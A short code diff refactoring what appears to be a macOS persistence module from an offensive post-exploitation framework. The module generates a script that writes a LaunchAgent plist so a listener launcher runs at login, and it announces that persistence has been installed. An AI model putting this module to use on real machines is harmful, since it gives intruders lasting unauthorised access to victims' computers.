@@ -87,7 +87,7 @@ class Module:
 
         PLISTName = self.options['PLISTName']['Value']
         programname = "~/Library/LaunchAgents"
-        plistfilename = "%s.plist" % PLISTName
+        plistfilename = f"{PLISTName}.plist"
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
@@ -113,7 +113,7 @@ class Module:
 </plist>
 """ % (PLISTName, launcher)
 
-        script = """
+        return """
 import subprocess
 import sys
 import base64
@@ -142,6 +142,8 @@ os.chmod(plistPath, 0644)
 
 print "\\n[+] Persistence has been installed: /Library/LaunchAgents/%s"
 
-""" % (PLISTName,plistSettings,PLISTName)
-
-        return script
+""" % (
+            PLISTName,
+            plistSettings,
+            PLISTName,
+        )
